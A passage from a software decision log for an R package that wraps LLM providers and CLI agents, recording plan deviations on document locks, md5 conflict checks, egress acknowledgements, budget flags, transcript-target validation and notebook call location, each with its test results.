2. **The fake CLI's NULL default is `if_null(a, b)`** instead of the plan's infix `` `%||%` ``
   with `# nolint: object_name_linter.` (plan finalize note F2, which mirrors `R/aaa-state.R`).
   This lane adds no lint suppressions and lintr flags the infix name without one, so the
   standalone script defines `if_null()` and its thirteen call sites use it. Behaviour is
   unchanged; the script is not part of the namespace and no other plan calls its copy.

Validation: `progress/P20.md`, Task 2. Two tests added (+23 expectations). Red against the
plan-literal source `[ FAIL 7 | WARN 0 | SKIP 0 | PASS 78 ]`
(`dev/.validation/P20/task2-fix1-red.log`; the `err$required` expectation was added after
it); final `^cli-common$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 99 ]` (`task2-fix1-green.log`), so every later plan count
for `test-cli-common.R` is 40 higher on macOS and Linux (17 from D-093, 23 from this entry).

## D-096 - P15 document I/O: a document lock that is gone or being released is not stale, a lock is never left without its pid file, NUL bytes are an encoding refusal and a directory a missing document, the md5 is that of the bytes read and of the bytes written, mixed line endings keep the majority ending, an unreadable file is a doc_write refusal, and the project file's record and transcript objects are updated in place under a P15 lock (2026-10-04)

P15 Task 4's literal `R/doc-io.R` (plan lines 2061-2321) is implemented with ten changes (items
7-10 and the final form of item 4 come from review round 1). Each is pinned by a test under
"Task 4 adaptations" or "Task 4 review round 1" in `tests/testthat/test-doc-io.R`, and each of
those tests fails against the plan literal:

1. **A lock being released is not stale (IC-71; D-091 item 2 for document locks).**
   `doc_lock_stale()` counted a lock directory that had vanished (`file.info()$mtime` is `NA`)
   as stale, so `doc_lock_acquire()` could `unlink()` a lock that another process had just
   taken. It also read the pid file after a `file.exists()` check, so an owner releasing the
   lock in between made `read_utf8()`'s error escape from `doc_lock()`. A missing directory, an
   unknown age or an unreadable pid file now counts as not stale, and the caller retries. An
   empty lock directory older than 30 s, a dead pid and an unparsable pid still count as stale.
   This is the rule of P08's `lock_stale()`, which L4 code cannot call.
2. **A lock is never left without its pid file.** When writing the pid file fails after the
   `mkdir`, the lock directory is removed before the error propagates. The plan left it in
   place, which blocked the document for 30 s.
3. **NUL bytes are `reason = "encoding"`; a directory is `"missing"`.** `rawToChar()` refuses
   embedded NULs with a base error, so a UTF-16 document (or any NUL byte) escaped as a plain
   error instead of `gptr_error_doc_write`. `readBin()` of a directory failed the same way.
4. **The md5 is that of the bytes read.** The plan computed it with `tools::md5sum()` after
   splitting the lines. A change made between the read and the md5 became the recorded base,
   so the next checked `doc_write()` overwrote it (contract 7.15's md5 conflict check). Round 0
   moved the md5 before the read, which still left the window between the `file.info()` size
   and the hash: a file that grew there was hashed whole but read truncated, and the next write
   dropped the appended text (review round 1). The md5 is now `cli::hash_raw_md5()` of exactly
   the bytes read (the same hex as `tools::md5sum()` of the file; a test pins this), so any
   change on disk during or after the read makes the next write a `conflict`.
5. **Mixed line endings keep the majority ending.** The plan wrote every line with CRLF as
   soon as one CRLF occurred, so one block inserted into a mostly-LF file rewrote every line.
   `doc_eol_of()` now picks CRLF only when at least as many lines end in CRLF as in a bare LF.
   Pure CRLF files and ties behave as before. Lines in the minority ending are still
   normalised.
6. **A `record` value that is not a JSON object is replaced.** The plan extended it into
   `{"1": ..., "<document>": ...}`.
7. **`doc_write()` records the md5 of the bytes it wrote.** The plan hashed the file again after
   `write_atomic()`, so an edit landing between the rename and that hash became the base of the
   next checked write and was overwritten. An edit there is now a `conflict`.
8. **A file that cannot be opened is `reason = "unreadable"`.** `readBin()` of a file without
   read permission raised a base error and a connection warning instead of
   `gptr_error_doc_write` (the same escape item 3 closes for NULs and directories). A file that
   vanishes between the size and the read is `"missing"`. Callers of `doc_write()` re-raise any
   reason but `"conflict"`, so the new reason changes no caller.
9. **`doc_project_transcript()` keeps the other keys of `transcript`.** The plan replaced the
   whole object with `{"target": ...}`, against contract 11 ("Unknown keys are preserved on
   rewrite"). It now updates `target` in place as `doc_project_remember()` updates `record`; a
   `transcript` value that is not an object is replaced.
10. **The `record` and `transcript` updates hold a P15 lock.** P08's `settings_write()` merges
    top-level keys only under its short lock, so the read-modify-write of `record` (plan
    ambiguity 12) could lose one of two answers remembered at the same moment by two processes.
    Only P15 writes `record` and `transcript`, and every other writer patches other top-level
    keys under P08's lock, so serialising P15's own update is enough: `doc_project_update()`
    holds a `doc_lock_acquire()` lock at `<project file>.doc-lock` across the read and the
    `settings_write()` (pid + creation time, IC-71). When another live process still holds it
    after 1 s, the update goes ahead without it rather than being dropped. Round 0 recorded this
    as a known limit for P08; no P08 change is needed now. The file is the one P08's
    `settings_path("user_project")` names; a test pins this.

Test-side (no behaviour change): the plan's "the byte fixtures round-trip exactly" called
`testthat::test_path()` after `local_project()` had changed the working directory, so the
relative fixture path no longer resolved and `file.copy()` failed silently. The paths are now
resolved first, and the copy is asserted. Later tasks that extend `test-doc-io.R` (10, 11, 18)
must resolve fixture paths before `local_project()` in the same way.

Validation: `progress/P15.md`, Task 4. Red (no source) `[ FAIL 15 | WARN 0 | SKIP 0 | PASS 1 ]`.
The plan literal gives `[ FAIL 10 | WARN 0 | SKIP 0 | PASS 58 ]` against the round-0 tests:
every failure is in the six adaptation tests (`dev/.validation/P15/task4-adapt-red.log`). Items
7-10: the four review-round-1 tests give `[ FAIL 7 | WARN 1 | SKIP 0 | PASS 80 ]` against the
round-0 source (`task4-fix1-red.log`), and the plan literal against the final tests gives
`[ FAIL 17 | WARN 1 | SKIP 0 | PASS 65 ]` (the same 10 and these 7; `task4-fix1-plan-literal.log`).
Green: `^doc-io$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 88 ]`,
the same under `LC_ALL=C`. The plan expects 41; the difference is 1 asserted copy, 6 for the
gptr_source() frame test, 25 for items 1-6 and 15 for items 4 and 7-10 (review round 1).

## D-097 - P20 status and model entries: codex/default is a model the Codex route lists, status(check = TRUE) runs the capability probe, and a malformed rate_limit_event reads as NA (2026-10-04)

P20 Task 3's plan-literal `R/cli-common.R` and one plan test changed after review round 1:

1. **codex/default resolves only to an id the Codex route lists** (contract 11.10: "resolve
   through the CLI provider's `status()` to a full id before any invocation"; architecture 8.4:
   "CLI invocations always receive full ids"). The plan's `pcli_default_model()` (its decision
   11) passed the catalog's newest GPT straight through. With the shipped catalog the `gpt` alias
   resolves to `gpt-6.1-sol`, which report 08 section 2.C found absent from a Pro account's Codex
   catalog ("requires access"; verification row 44 confirmed for the bundled catalog) and which
   `pcli_models("codex")` does not list. A ChatGPT-plan user with only codex installed would get
   `codex exec -m gpt-6.1-sol` (and Task 11's live test, which uses `codex/default`, would hit
   it). For codex the catalog id is now used only when it is one of the full ids of
   `pcli_models("codex")`; otherwise the fixed fallback `gpt-6-sol` (also architecture 8.4's
   OpenAI default) applies. claude keeps the plan's catalog passthrough (the claude CLI takes the
   API's full ids). The plan test "CLI invocations always get full model ids" now expects
   `gpt-6-sol` for a mocked catalog GPT `gpt-9-9` instead of `gpt-9-9`. When a live check
   confirms a newer id on the Codex route, adding it to `pcli_models("codex")` lets the catalog
   alias reach it again.
2. **`status(check = TRUE)` runs the capability probe** (contract 7.20: the `--help` probe runs
   "only on first use or `check = TRUE`"). The plan's branch forgot the cached version and probe
   and re-ran only `pcli_version()`, which records the status without an error, so a recorded
   "bare by default", "missing exec flags" or "help unreadable" became "ready" with
   `available = TRUE` until the next use re-probed, and P05's `model_default()` could pick a CLI
   that fails on its first turn. The branch now calls `pcli_probe()` (which runs
   `pcli_version()` first); both are local runs, never a model request.
3. **A malformed `rate_limit_event` reads as NA** instead of signalling "subscript out of
   bounds": `pcli_plan_set()` treats an `info` or `unifiedWindows` value that is not a list as
   empty, and a field that is not a single string or number as NA, so Task 6's informational
   event never ends a turn.

Validation: `progress/P20.md`, Task 3. Three tests added (+22 expectations) and one plan
expectation changed. Red against the plan-literal source `[ FAIL 11 | WARN 0 | SKIP 0 | PASS 128 ]`
(`dev/.validation/P20/task3-fix1-red.log`); final `^cli-common$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 148 ]` (`task3-fix1-green.log`), so every later plan count
for `test-cli-common.R` is 62 higher on macOS and Linux (17 from D-093, 23 from D-095, 22 from
this entry).

## D-098 - P20 turn helpers: pcli_stop_child() stops a watched child through P05's stream_process_kill(), a turn without reported usage is unknown, and wire-log values are redacted before encoding (2026-10-04)

P20 Task 4's plan-literal `R/cli-common.R` changed in three ways, which Tasks 5-10 consume:

1. **`pcli_stop_child()` ends with `stream_process_kill(p, watch, job)`** (D-018 item 1, "For
   P20"). The plan forgot the child, closed its stdin and called `kill_all(p, grace = 1)`
   directly. A child of P05's `process_jsonl` transport has a P04 watcher and a `cli` job row
   (`opts$state$watch`, `opts$state$job`), and `kill_all()` under the living watcher closes the
   pipes the watcher polls: the watcher stays registered and the job row stays `running`. The
   function now reads `state$watch` and `state$job` with the child (they belong to it) and,
   after the interrupt, the wait and `write_close()`, calls P05's `stream_process_kill()`:
   P04's `reactor_cancel()` of the watcher (interrupt, grace, `kill_all()` of the tree) and
   `job_remove()`; a child without a watcher is killed directly with `kill_all(p)`. The kill's
   grace is P04's default 2 s instead of the plan's 1 s; a claude or fake child whose stdin was
   just closed exits at end of input well before it. The wait for the interrupt's
   acknowledgement still tests the child itself (`!pcli_alive(p)`, D-018 item 4).
2. **Unreported usage is unknown** (IC-74, 07-local-ollama.md section 5; D-015, D-022).
   `pcli_message()` fell back to `usage_new()`, whose legacy zeros made a failed turn (no CLI
   result, so no usage) a known zero-token, zero-cost request. It now falls back to P05's
   `usage_as(NULL)` (every counter, the total and the cost `NA`), and `pcli_done()`'s `done`
   event carries the message's usage record (contract 4.5 lists `usage` on `done`; the plan
   emitted `NULL` when the caller passed none). Adapters still pass `cost = NULL` to
   `usage_new()` when the CLI reported tokens but no cost (D-015 point 3).
3. **Wire-log values are redacted before encoding**, as P04's `wire_log()` does
   (`json_encode(redact(rec, "persist"))`). The plan redacted the encoded line, so a redaction
   rule ending in `\S*` or `\S+` (a common form; a compact JSON line has no blank) ran on to the
   end of the line and wrote invalid JSON.

Validation: `progress/P20.md`, Task 4. Three tests added (+20 expectations); the plan's eight
tests are verbatim. Against the plan-literal source `[ FAIL 8 | WARN 0 | SKIP 0 | PASS 211 ]`
(items 1-2; `dev/.validation/P20/task4-plan-literal.log`) and, for item 3,
`[ FAIL 1 | WARN 0 | SKIP 0 | PASS 219 ]` (`task4-wire-red.log`); final `^cli-common$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 223 ]` (`task4-green.log`), so every later plan count for
`test-cli-common.R` is 82 higher on macOS and Linux (17 from D-093, 23 from D-095, 22 from
D-097, 20 from this entry).

## D-099 - P08 replay and egress: egress follows the effective endpoint and the Ollama local-only control, acknowledgements are keyed by the provider's own id and recorded under the file lock, nobody is asked inside a run that cannot ask, and the replay guard resolves references without discovery (2026-10-04)

P08 Task 4's literal `replay_mode()`/`replay_guard()`/`egress_check()` (`R/gptr-config.R`)
predate IC-74. Behaviours that differ from the plan literal, which Task 7 (`gptr_config()`),
Task 9 (`gateway_guards()`, `router_guards()`), P13, P19 and P05's `gptr_providers()` consume:

1. **Egress follows the effective endpoint (IC-74; architecture 6.10 "A static provider `local`
   flag or loopback URL does not exempt a cloud-backed model or remote override"; 07 section 5;
   D-020 item 1).** The plan exempted every provider whose record says `local = TRUE`. The new
   `egress_state(p)` exempts an offline provider, and a local one only when its effective endpoint
   (P05's `catalog_endpoint()`: settings `base_url` > record > environment template) is a loopback
   address; a local provider without an HTTP endpoint is not exempt either (as `gptr_providers()`
   shows it). So a remote `providers.ollama.base_url` or a LAN `lmstudio` needs the
   acknowledgement, and the refusal names the origin and why.
2. **A loopback Ollama is exempt only while local-only inference is enforced (07 sections 2.1 and
   5: "FALSE relaxes only local-only rejection; normal egress acknowledgement remains required";
   "a cloud route requires ... local-only disabled, and the normal egress acknowledgement").**
   Only under the local-only policy does P05's preflight refuse a cloud model or a remote marker
   behind a loopback server before anything is sent, and `egress_check(provider_id)` cannot see
   the model. For an Ollama route provider (id `ollama`, or api `ollama-system-one`) the
   exemption therefore also needs `settings_local_only("ollama")` (the protected user/session
   control, D-094 item 1) and, inside a run, the run's frozen `safety$ollama_local_only`
   (`catalog_local_only()`); when either relaxes it, the acknowledgement is required. Other local
   servers (LM Studio, llama.cpp, vLLM) are not governed by this control. Projects, options,
   `.opts` and model code cannot relax the control (D-094), so they cannot remove an
   acknowledgement requirement either.
3. **Acknowledgements are keyed by the provider's own id.** An alias finds the provider, and the
   acknowledgement, the condition's `provider` and the hint use its id (as `gptr_providers()`
   reads `egress.<id>`). An id that is not a plain provider id (`^[a-z0-9][a-z0-9-]*$`) is
   `gptr_error_invalid_argument` (`arg = "provider_id"`), because the hint pastes it into code the
   user is told to run.
4. **The acknowledgement is recorded under the user file's lock (IC-71).** The plan read the
   acknowledgements outside the lock and wrote the whole `egress` object back, so one given by
   another R process in between was lost. `egress_record()` loads the file under its lock
   (`settings_file_load()`), adds the one entry and writes it, keeping the other keys' JSON form;
   a file that is not a JSON object is never rewritten.
5. **Nobody is asked inside a run that cannot ask (IC-43, IC-53).** Besides `gptr_can_prompt()`,
   inside a run the run's safety record (a list or an environment) must say `can_prompt = TRUE`;
   like P06's gate (`run_budget_extend()`, `perm_ask()`) this fails closed, so a background run, a
   child without a human, or a snapshot without `can_prompt` never asks, and the call stops with
   `gptr_error_egress` (IC-53 item 6: the acknowledgement is an `ask_human`).
6. **The question names the effective endpoint** (`<id> (<origin>)`) when the provider has one.
7. **`replay_guard()` resolves a reference before splitting it.** The plan cut a reference at
   its first `:` (the thinking suffix) and then at `/`, so a provider-less colon id such as
   `qwen3:1.7b` was looked up as `qwen3`, another model. A string is now resolved with
   `model_resolve(strict = FALSE)` (deterministic, no discovery, 07 section 2.1); an unknown one
   names the provider before its first `/`, or itself (and is refused in replay mode). Fields
   are read with `[[` (no partial matching), and `what` must be one string. Nothing in replay
   mode discovers, prepares or contacts a provider (07 section 4; a local server is not offline,
   so replay refuses it).
8. **Test split, temporary.** The plan's test evaluated the `how_to_ack` hint, which calls
   `gptr_config()` (Task 7). The hint's string and its parse are checked now; the evaluation is a
   separate test, "following the egress hint keeps the acknowledgements already given", skipped
   while `gptr_config()` is absent. **P08 Task 7 MUST remove that skip.**

Obligations: **Task 9's `gateway_guards()`/`router_guards()`** must not skip `egress_check()` on
the `local` hint (plan literal `local = isTRUE(pr$local) || isTRUE(pr$offline)`); they use
`egress_state(<session provider record>)$exempt` (a session-scoped record that `provider_get()`
cannot see) and otherwise call `egress_check()`, keeping the `.opts$context = "none"` exemption.
The P13 (`s1_*`, plan line 3800) and P19 (`subagent_guards()`, plan line 822) literals skip
`egress_check()` for `local` providers in the same way and should use `egress_state()`. P05's
`provider_egress()` (the `gptr_providers()` column) still shows `ack` for a loopback Ollama while
local-only is relaxed; it should follow item 2 (P05 follow-up, not done here).

Validation: `progress/P08.md`, Task 4. Red (no Task 4 code) `^gptr-config$`
`[ FAIL 14 | WARN 0 | SKIP 1 | PASS 262 ]` (`dev/.validation/P08/task4-red.log`); against the
plan-literal source `[ FAIL 14 | WARN 0 | SKIP 1 | PASS 302 ]`
(`task4-red-adaptations-against-plan-literal.log`, every failure in the adaptation tests); green
`[ FAIL 0 | WARN 0 | SKIP 1 | PASS 337 ]` (`task4-green.log`); after review round 1 (item 5 fails
closed, an empty `provider` field is a bad `model`) `[ FAIL 0 | WARN 0 | SKIP 1 | PASS 356 ]`
(`task4-fix1-green.log`).

## D-100 - P15 write consent and S2: a document control refusal names the running tool, an S2 file that is not a JSON object is a miss, and a remembered transcript target grants consent only when it is well formed and a target IC-52 allows (2026-10-04)

P15 Task 7's literal `R/doc-replay.R` is kept except for four behaviours:

1. **The refusal names the running tool (IC-53, contract 2.2).** `doc_control_guard()` fills the
   `tool` field of `gptr_error_permission` from `run$tool_call$name` (else `"r"`), as P08's
   `control_check()` (D-091 item 3) and P06's `session_control_check()` do; the plan always said
   `"r"`. `control_check()` itself stays out of reach (L6, not in IC-33's kernel SDK), so the L4
   copy keeps the same token protocol (`run$signal$control`, one-shot).
2. **An S2 file that is not a JSON object is a miss (contract 11.9).** `s2_get()` returned any
   parsed JSON value, so a cache file holding a scalar or an array reached callers that read
   `$answer`; it now returns the record only when it is a named list, else `NULL`.
3. **A malformed user-level project file is ignored (contract 11.3).** The plan's
   `doc_consent()` read `pf$transcript$target` with `$`, so a `transcript` entry that is not a
   JSON object (`{"transcript": "a.R"}`) made `doc_consent()` and `doc_consent_possible()`
   throw `$ operator is invalid for atomic vectors` for every document of the project. Task 4's
   writer `doc_project_update()` already replaces such a value. `doc_project_entry(pf, key,
   name)` reads `record` and `transcript` entries with `[[` (no partial matching), a value that
   is not a JSON object is absent, and a target counts only as one non-empty string.
4. **A remembered transcript target is consent only where IC-52 allows a target.** IC-52 says
   transcript targets lie inside the project root, have a document extension and are not a
   control or protected path; plan self-review item 13 applies that rule to remembered
   transcript targets, and Task 8's `doc_transcript_target()` ignores a target that fails
   `doc_target_valid()`. The plan's `doc_consent()` granted consent to any remembered target,
   so `../outside.R` or `.gptr/extensions/x.R` became writable. `doc_remembered_target(pf)` now
   returns the absolute target only when it passes the same rule as Task 8's
   `doc_target_valid()`: a known document format, strictly inside `project_root()`, and a path
   class that is not `control`, `protected`, `critical`, `instructions`, `url` or `wildcard`.
   Task 8 obligations: once `doc_target_valid()` exists, `doc_remembered_target()` calls it
   instead of repeating the rule, and `doc_transcript_target()` reads the remembered target
   through `doc_project_entry()` (its literal `doc_project_get()$transcript$target` has the
   item 3 failure). The binding of `gptr_doc()` still accepts a document outside the root
   (self-review item 13).

Unchanged and now pinned by tests: the S2 answer is redacted with the `persist` profile at
ingress, and every other field the caller passes (IC-74: provider, model digest, locality,
image digests) is stored and read back unchanged. `s2_put()` writes to `s2_path(key)` (the plan
built the same path from `workspace_root()`; `doc_root()` names the same directory and
`dir.create(recursive = TRUE)` creates it).

Validation: `progress/P15.md`, Task 7. Red (no `R/doc-replay.R`) `^doc-replay$`
`[ FAIL 7 | WARN 0 | SKIP 0 | PASS 0 ]` (`dev/.validation/P15/task7-red.log`); against the
plan-literal source `[ FAIL 2 | WARN 0 | SKIP 0 | PASS 38 ]` (`task7-plan-literal.log`: the
tool name and the scalar S2 file); green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 40 ]`
(`task7-green.log`). Items 3 and 4 (review round 1): with 2 regression tests added and the
round-0 source, `[ FAIL 7 | WARN 0 | SKIP 0 | PASS 41 ]` (`task7-fix1-red.log`); green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 52 ]` (`task7-fix1-green.log`).

## D-101 - P20 cli-claude build: a budget value that is not finite adds no flag and a large turn cap stays a number, and white-space-only text never becomes a content block (2026-10-04)

P20 Task 5's plan-literal `R/cli-claude.R` changed in two ways; the plan's five tests are
verbatim:

1. **Budget flags are finite numbers.** `pcli_claude_args()` turned `turns` into
   `as.character(max(1L, as.integer(turns)))` and `cost` into `format(max(0.01, round(cost, 4)))`
   for any value `pcli_scalar_num()` accepts, which includes `Inf`. `Inf` or a turn cap above
   `.Machine$integer.max` gave an R warning inside `build()` and the argv words `"NA"` or `"Inf"`,
   which are not numbers. A value that is not finite now adds no flag (no limit, as without a
   budget; P06's `budget_check()` stays authoritative between requests, plan ambiguity 2), and
   `--max-turns` is `max(1, floor(turns))` written as a plain number, the same word as before
   for every value below 2^31. Review round 1 (finding 2): one helper, `pcli_claude_flags()`,
   now keeps a value only when it is positive and finite, and `pcli_claude_args()`,
   `pcli_claude_budgeted()` and `build()`'s `state$claude_flags` all use it. Before, `build()`
   stored the raw `Inf` and `pcli_claude_budgeted()` only tested `!is.null`, so a child started
   under `cli_budget = list(cost = Inf)` had no flag on its argv yet counted as budgeted: it was
   restarted with `--resume` at every top-level call and Task 9's `agent_end` hook would retire
   it after every run, instead of living across runs as an unbudgeted child does.
2. **White-space-only text is dropped.** `pcli_claude_content()` kept every text or context
   block whose text was non-empty, so a block of blanks or newlines reached the CLI's Messages
   API request, which refuses white-space-only text blocks. It now keeps a text block only when
   `nzchar(trimws(text))`, as P12's `anthropic_user()` does; input without any block is still
   the single `(no new input)` block.
3. **Budget words ignore the session's options** (review round 1, finding 1). The plan's
   `format(max(0.01, round(cost, 4)))` follows `options(OutDec)` and `options(digits)`: under
   `OutDec = ","` a budget of 2.5 became the argv word `"2,5"`, which the CLI cannot read as a
   number, and under `digits = 2` a remaining 1234.5678 became `"1235"`, above the remaining
   budget. Both flags are now written by `pcli_claude_number()`:
   `format(x, scientific = FALSE, trim = TRUE, digits = 15, decimal.mark = ".", big.mark = "")`,
   so the word is the value rounded to 4 decimals, whatever `OutDec`, `digits` or `scipen` say
   (as `env_fmt_n()` in `env-snapshot.R` already fixes the decimal mark).

Not changed and recorded here: the first user line of a fresh claude child carries the earlier
conversation and the input's base64 images, so its size is not bounded; P05's transport writes it
with `write_all()`, which blocks on Windows until the CLI has read it (D-019 item 5, an open P04
decision). A deadlock needs a CLI that stops reading stdin while its stdout pipe is full; the
stream-json CLI is meant to read stdin as it arrives (not verified on Windows), so the expected
effect is a pause of the R session during a large write, not a hang. Bounding the line would drop conversation or images.

Validation: `progress/P20.md`, Task 5. Two tests added (+5 expectations). Against the
plan-literal source `[ FAIL 4 | WARN 2 | SKIP 0 | PASS 39 ]`
(`dev/.validation/P20/task5-plan-literal.log`; the two warnings are `as.integer()`'s NA
coercions); then `^cli-claude$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 43 ]` (`task5-green.log`).
Review round 1 added two more tests (+9 expectations, items 1 and 3): red
`[ FAIL 7 | WARN 0 | SKIP 0 | PASS 45 ]` (`task5-fix1-red.log`), final `^cli-claude$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 52 ]` (`task5-fix1-green.log`), so every later plan count
for `test-cli-claude.R` is 14 higher.

## D-102 - P08 capture and argument validation: .opts takes the System 1 image records of IC-74 and never the protected providers or egress settings or a run's safety record, choice-valued arguments take one string, described choices are unique by label, image paths may be a character vector, and call_value() refuses a bad index and a released value (2026-10-04)

P08 Task 5's literal `R/gptr-capture.R` predates IC-74. Behaviours that differ from the plan
literal, which Task 8 (`gptr()`), Task 9 (`gateway_run()`, `gateway_image_blocks()`) and P13's
classifier route consume:

1. **`.opts$system1_images` (IC-74, 07-local-ollama.md section 4: "P08 validates the option
   shape").** A new core option: a list of records `list(data = <non-empty raw>, mime =
   "image/png" | "image/jpeg" | "image/webp")`, each a plain list with exactly those two fields; a
   path, a file name, base64 text or a classed object is `gptr_error_invalid_argument` (07: never
   silently replace an image with its filename). One bare record is a list of one; names of the
   list are dropped, so its order is the order of sending and hashing (P13's
   `s1_cache_identity()` keeps list order). The model's and adapter's limits are P13's checks.
2. **`.opts` never names a protected setting (IC-74, 07 sections 2.1 and 5: per-call options
   cannot relax `local_only`; contract 11.2: `egress` from the user file only; D-094 item 9).**
   `.opts$providers` and `.opts$egress` are refused even when a plugin registers `providers.*` or
   `egress.*` setting specs (IC-44 would otherwise accept them as a namespace), so call data can
   carry neither `providers$ollama$local_only` nor an acknowledgement. `.opts$safety` is refused
   the same way (`gateway_opts_reserved()`, review round 1): `safety` is the name of a run's
   frozen safety record (`run_new()`'s `run$opts$safety`, IC-53), which P05's `stream_safety()`
   and P13's `s1_request()` read as `opts$safety`, so a plugin's `safety.*` settings cannot let
   call data carry `safety$ollama_local_only` (07 section 2.1: never from per-call options).
3. **Choice-valued arguments take one string.** P01's `check_choice()` returns the first choice
   when it is given the whole vector (match.arg()'s missing-argument convention), so the plan
   accepted `.opts$context = c("summary", "names", "none")` as `"summary"` and `replay =
   c("auto", ...)` as `"auto"`. `gateway_choice()` requires a single string for `thinking` (from
   P05's `catalog_thinking_levels`), `context`, `output`, `preset`, `backend`, `frontend` and
   `replay`.
4. **`choices` is unique by label, read as P13 reads it.** A character vector named in full gives
   its labels by name (the values are descriptions, which may repeat, be empty or NA), otherwise
   by value; at least two unique non-empty labels. The plan tested the values, refusing
   `c(up = "", down = "")`. Logical-looking labels (`gptr_error_s1_labels`) and the option limits
   of the model stay with P13 (`s1_question_choice()`), so P08 does not pre-empt P13's class.
5. **`.opts$images`** accepts a character vector of paths (each one image) and refuses a
   directory, which `file.exists()` alone let through to Task 9's `readBin()`.
6. **`call_value(call, i)`** checks `call` and `i` (`gptr_error_invalid_argument` instead of R's
   subscript error), and a value item read after `call_release()` is `gptr_error_internal`, as a
   symbol item already was (the plan returned `NULL`, indistinguishable from a `NULL` value).
7. **`dot_sites()` and `dot_labels()`** never bind an argument expression to a local, so these
   two leaves read an empty argument (`gptr("x", , big)`) as a dot without a symbol, labelled
   `..i`, rather than failing with `argument "e" is missing`. This does not make such a call
   work end to end: Task 8's loop still forces that dot through `...elt(i)`, and refusing it with
   `gptr_error_invalid_argument` is Task 8's. `interpolate_prompt()` accepts an empty template
   (`gptr("")`).

Validation: `progress/P08.md`, Task 5. Red (no source) `^gptr-capture$`
`[ FAIL 22 | WARN 0 | SKIP 0 | PASS 0 ]` (`dev/.validation/P08/task5-red.log`); against the
plan-literal source `[ FAIL 10 | WARN 0 | SKIP 0 | PASS 123 ]`
(`task5-red-adaptations-against-plan-literal.log`, every failure in the adaptation tests); green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 174 ]` (`task5-green.log`; the plan's 12 tests give its 65).
Review round 1 (`.opts$safety` reserved, `dot_labels()` of an empty argument): regression red
`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 171 ]` (`task5-fix1-red.log`), green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 178 ]` (`task5-fix1-green.log`).

## D-103 - P15 locator: the steps of a pipeline that repeats a prompt are told apart by their call (in notebooks too), a notebook call with a computed prompt is anchored by its call, the remembered transcript target is read through the IC-52 check, nobody is asked where to record when no target can be offered, a malformed context item or session never stops the console fallback, a call nested in a running document is no console turn, a relative `Rscript --file=` is resolved from the launch directory, a computed prompt whose value equals a literal prompt is located as its own call, and a script sourced with `chdir = TRUE` is found from the directory it was sourced from (2026-10-04)

P15 Task 8's literal `R/doc-locate.R` (and its IDE queries in `R/doc-io.R`, and one line of Task
6's `doc_ipynb_locate()` in `R/doc-formats.R`) is kept except for nine behaviours:

1. **Pipeline steps with the same prompt are located as themselves (contract 11.5; plan
   self-review ambiguity 28).** The plan anchored a call on the first row of its statement (or,
   under `Rscript`, of its file) that has its prompt hash. In
   `out = gptr("draft") |> gptr("improve it") |> gptr("improve it")` the third call was then
   located as the second (ordinal 2, owning `call=2`'s block) under `source()` with and without
   srcrefs, and under `Rscript` the second and third steps swapped ordinals. Ambiguity 28 only
   works if the locator tells these calls apart. `doc_by_identity()` keeps, among rows with the
   same prompt hash, those whose identity text parses to the evaluated call (`sys.call()`, through
   Task 2's `doc_calls_have()`); without a call, or when no row is that call, the rows are kept.
   The `Rscript` execution counter is keyed by the candidate rows' own identity: their prompt
   hash (none for a computed prompt) plus their identity hashes. Repeated identical statements
   still count 1, 2, ... as in the plan. The plan keyed it by the runtime prompt hash, so for
   `q = "a"; x = gptr(q); q = "b"; y = gptr(q)` each runtime value started its own counter and
   both executions were located at `x = gptr(q)` (review round 1).
   Notebooks too (review round 4): the notebook anchor kept only the prompt hash and the cell's
   ordinal, and `doc_ipynb_locate()` took the cell's first row with that hash. In a cell
   `out = gptr("draft") |> gptr("improve it") |> gptr("improve it")` followed by its three agent
   cells, step 3 was located as step 2: ordinal 2, owning step 2's `call=2` cell, so it replayed
   step 2's answer or overwrote its cell. `doc_nb_anchor()` now always keeps the call (`call0`)
   and `doc_ipynb_locate()` narrows the cell's rows with `doc_by_identity()`. The calling cell
   itself is found as in a script (`doc_nb_cell()`): the first cell holding a candidate row, the
   call itself first, so the step is no longer found in an earlier cell that calls
   `gptr("improve it")` on its own. `nb_find_call_cell()` is unchanged: it uses the call only
   when no row has the prompt hash.
2. **A notebook call with a computed prompt is anchored by its call (contract 11.5, ambiguity
   27).** The plan stored the runtime prompt hash in the notebook anchor and dropped the call.
   The cell's row for `gptr(paste("dy", "n"))` has no prompt hash, so `doc_ipynb_locate()` never
   found the cell again: the call was reported as not top-level and owned no agent cell.
   `doc_nb_anchor()` stores the prompt hash as written in the cell (NA for a computed prompt)
   and the call when it is NA, as the `r` format's anchors already do.
3. **The remembered transcript target goes through the IC-52 check (Task 7 obligations,
   D-100 items 3 and 4).** `doc_transcript_target()` reads the target through
   `doc_project_entry()` and `doc_remembered_target()`. The plan's
   `doc_project_get()$transcript$target` threw `$ operator is invalid for atomic vectors` for
   `{"transcript": "a.R"}`.
   `doc_remembered_target()` now calls `doc_target_valid()` instead of repeating its rule, and
   `doc_target_valid()` answers `FALSE` for anything but one non-missing string (a vector made
   the plan's `if()` fail).
4. **Nobody is asked where to record when no target can be offered.** With no valid active
   document and no `.gptr/` workspace, the plan still asked whether to record into
   `.gptr/transcripts/`. A yes then remembered `"off"` for the project, because no transcript
   can be created there, so transcripts stayed off after `gptr_init()`. `doc_ask_transcript()`
   now offers only targets that exist. It returns NA when there is nothing to offer, when the
   UI backend reports it cannot ask (`has_ui()` false), or when its `select()` throws (a failing
   dialog is not an answer, contract 10.2 row 22; the plan turned the error into "Nowhere" and
   remembered `"off"` for the project). Then nothing is remembered and the next turn asks
   again. A cancel (`select()` returns NA) stays the plan's "Nowhere". With an active document
   and no workspace, the yes/no question names that document.
5. **The console fallback never throws.** `doc_locate()` read `x$kind` of every context item
   and `session_data()` of the session. A context item that is not a list, or a session that is
   not one, made the whole locate fail inside the `document` route. Context items are read with
   `[[` and only symbol items with one name count (`doc_context_labels()`). The session id and
   the console site are computed inside `tryCatch()`.
6. **A call nested in a running document is no console turn (03 section 6.9.3: calls nested in
   functions and loops have no block; contract 11.5; IC-56 reads `call$top_level`; review
